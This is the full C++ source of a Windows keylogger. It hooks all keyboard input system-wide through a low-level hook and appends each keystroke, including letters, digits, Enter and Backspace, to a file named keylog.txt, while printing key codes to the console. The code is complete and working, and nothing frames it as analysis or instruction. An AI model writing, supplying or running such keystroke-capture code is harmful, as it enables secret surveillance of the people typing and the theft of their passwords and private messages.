#include <iostream>
#include <windows.h>
#include <fstream>
#include <unordered_set>

std::unordered_set<int> ignoredKeys = {
    VK_LCONTROL, VK_RCONTROL,
    VK_LSHIFT, VK_RSHIFT,
    VK_LMENU, VK_RMENU,
    VK_CAPITAL, // Caps Lock
    VK_NUMLOCK, VK_SCROLL,
    VK_INSERT, VK_HOME,
    VK_PRIOR, VK_NEXT,
    VK_END, VK_DELETE
};

bool keyDownMap[256] = { false };

void logKeystroke(int key) {
    std::ofstream logfile("keylog.txt", std::ios::app);
    if (!logfile.is_open()) return;

    if (key == VK_BACK)
        logfile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logfile << "[ENTER]\n";
    else if (key == VK_SPACE)
        logfile << " ";
    else if (key == VK_TAB)
        logfile << "[TAB]";
    else if (key == VK_ESCAPE)
        logfile << "[ESC]";
    else if (key == VK_OEM_PERIOD)
        logfile << ".";
    else if (key >= 'A' && key <= 'Z')
        logfile << char(key);
    else if (key >= '0' && key <= '9')
        logfile << char(key);
    else
        logfile << "[" << key << "]";

    logfile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;

        if (ignoredKeys.count(key)) return CallNextHookEx(NULL, nCode, wParam, lParam);

        if (wParam == WM_KEYDOWN && !keyDownMap[key]) {
            keyDownMap[key] = true;
            logKeystroke(key);
            std::cout << "Key Pressed: " << key << std::endl;
        }

        if (wParam == WM_KEYUP)
            keyDownMap[key] = false;
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (keyboardHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    std::cout << "Keylogger is running... Press Ctrl+C to stop.\n";

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
